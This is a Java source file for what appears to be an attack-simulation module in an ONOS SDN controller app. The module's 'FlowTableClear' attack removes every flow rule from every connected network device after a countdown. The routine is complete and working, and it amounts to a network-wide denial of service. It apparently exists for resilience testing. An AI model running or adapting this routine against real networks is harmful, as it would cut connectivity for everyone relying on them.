package org.onosproject.airs.attack;

import java.util.Iterator;

import org.onosproject.net.Device;
import org.onosproject.net.device.DeviceService;
import org.onosproject.net.flow.FlowEntry;
import org.onosproject.net.flow.FlowRuleService;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class FlowTableClear extends AbstractAttack {

  public static final String NAME = "FlowTableClear";
  public static final String DESCR = "Flow table clearance";

  private final Logger log = LoggerFactory.getLogger(getClass());

  private final DeviceService deviceService;
  private final FlowRuleService flowRuleService;

  public FlowTableClear(final DeviceService deviceService, final FlowRuleService flowRuleService,
    final int countdownSec) {
    super(NAME, DESCR, countdownSec);

    this.deviceService = deviceService;
    this.flowRuleService = flowRuleService;
  }

  @Override
  protected Logger getLog() {
    return log;
  }

  @Override
  protected void runAttack() {
    logInfo("will try to remove all flow rules from all devices");
    int numDevices = 0;
    int numFlows = 0;

    // Iterate over devices
    final Iterable<Device> devices = deviceService.getDevices();
    final Iterator<Device> deviceIter = devices.iterator();
    while (deviceIter.hasNext()) {
      final Device device = deviceIter.next();
      numDevices++;

      // Iterate over flows
      final Iterable<FlowEntry> flowEntries = flowRuleService.getFlowEntries(device.id());
      final Iterator<FlowEntry> flowEntryIter = flowEntries.iterator();
      while (flowEntryIter.hasNext()) {
        final FlowEntry flowEntry = flowEntryIter.next();
        numFlows++;

        // Remove flow
        flowRuleService.removeFlowRules(flowEntry);
      }

      // Don't go too fast, wait a reasonable amount of time
      try {
        Thread.sleep(100);
      } catch (final InterruptedException e) {
        logException("interrupted during sleep", e);
      }
    }

    // Done.
    logInfo("removed {} flow rules from {} devices", numFlows, numDevices);
  }
}
